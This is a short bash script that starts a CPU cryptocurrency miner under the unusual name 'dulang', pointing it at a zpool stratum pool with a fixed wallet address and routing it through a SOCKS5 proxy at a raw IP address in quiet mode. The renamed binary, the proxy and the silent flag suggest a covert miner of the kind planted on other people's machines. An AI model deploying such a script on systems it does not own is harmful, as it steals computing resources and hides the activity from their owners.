#!/bin/bash
POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
WALLET=CUR146RLHFpK1icXKNGWSYHcyVK391daok
PROXY=socks5://72.49.49.11:31034
./dulang -a cpupower -o $POOL -u $WALLET -p c=CPU,zap=CPU -x $PROXY -q
